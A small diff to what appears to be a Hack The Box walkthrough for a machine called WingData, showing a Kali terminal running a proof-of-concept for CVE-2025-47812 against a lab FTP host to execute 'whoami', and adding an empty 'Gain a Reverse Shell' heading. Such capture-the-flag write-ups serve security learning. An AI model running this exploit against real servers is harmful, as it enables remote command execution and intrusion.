@@ -555,7 +555,6 @@ Logic Flow of the Script:
 Output:
 
 ```shell
-                                                                                                                    
 ┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
 └─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"
 
@@ -568,6 +567,10 @@ Output:
 wingftp
 ----------------------
 ```
+
+**Gain a Reverse Shell:**
+
+
 <div align="center">
 <br>
 <br>
